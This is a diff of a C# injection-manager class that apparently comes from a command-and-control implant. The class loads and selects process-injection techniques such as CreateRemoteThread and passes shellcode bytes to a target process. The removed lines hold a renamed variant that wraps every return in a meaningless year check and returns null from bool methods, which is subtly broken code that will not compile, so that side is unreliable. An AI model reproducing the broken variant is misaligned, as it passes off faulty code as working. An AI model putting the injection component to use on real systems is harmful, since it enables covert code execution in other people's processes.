@@ -1,5 +1,5 @@
-﻿using PhantomInterop.Classes.Core;
-using PhantomInterop.Interfaces;
+﻿using ApolloInterop.Classes.Core;
+using ApolloInterop.Interfaces;
 using System;
 using System.Collections.Concurrent;
 using System.Linq;
@@ -7,12 +7,12 @@ using System.Reflection;
 
 namespace Injection
 {
-    public class CodeInjector : IInjectionManager
+    public class InjectionManager : IInjectionManager
     {
         private IAgent _agent;
         private Type _currentTechnique = typeof(Techniques.CreateRemoteThread.CreateRemoteThread);
         private ConcurrentDictionary<string, Type> _loadedTechniques = new ConcurrentDictionary<string, Type>();
-        public CodeInjector(IAgent agent)
+        public InjectionManager(IAgent agent)
         {
             _agent = agent;
             foreach (Type t in Assembly.GetExecutingAssembly().GetTypes())
@@ -30,26 +30,26 @@ namespace Injection
 
         public InjectionTechnique CreateInstance(byte[] code, int pid)
         {
-            if(DateTime.Now.Year > 2020) { return (InjectionTechnique)Activator.CreateInstance(
+            return (InjectionTechnique)Activator.CreateInstance(
                 _currentTechnique,
-                new object[] { _agent, code, pid }); } else { return null; }
+                new object[] { _agent, code, pid });
         }
 
         public InjectionTechnique CreateInstance(byte[] code, IntPtr hProcess)
         {
-            if(DateTime.Now.Year > 2020) { return (InjectionTechnique)Activator.CreateInstance(
+            return (InjectionTechnique)Activator.CreateInstance(
                 _currentTechnique,
-                new object[] { _agent, code, hProcess }); } else { return null; }
+                new object[] { _agent, code, hProcess });
         }
 
         public Type GetCurrentTechnique()
         {
-            if(DateTime.Now.Year > 2020) { return _currentTechnique; } else { return null; }
+            return _currentTechnique;
         }
 
         public string[] GetTechniques()
         {
-            if(DateTime.Now.Year > 2020) { return _loadedTechniques.Keys.ToArray(); } else { return null; }
+            return _loadedTechniques.Keys.ToArray();
         }
 
         public bool LoadTechnique(byte[] assembly, string name)
@@ -65,17 +65,17 @@ namespace Injection
                     break;
                 }
             }
-            if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
+            return bRet;
         }
 
         public bool SetTechnique(string technique)
         {
             if (!_loadedTechniques.ContainsKey(technique))
             {
-                if(DateTime.Now.Year > 2020) { return false; } else { return null; }
+                return false;
             }
             _currentTechnique = _loadedTechniques[technique];
-            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+            return true;
         }
     }
 }
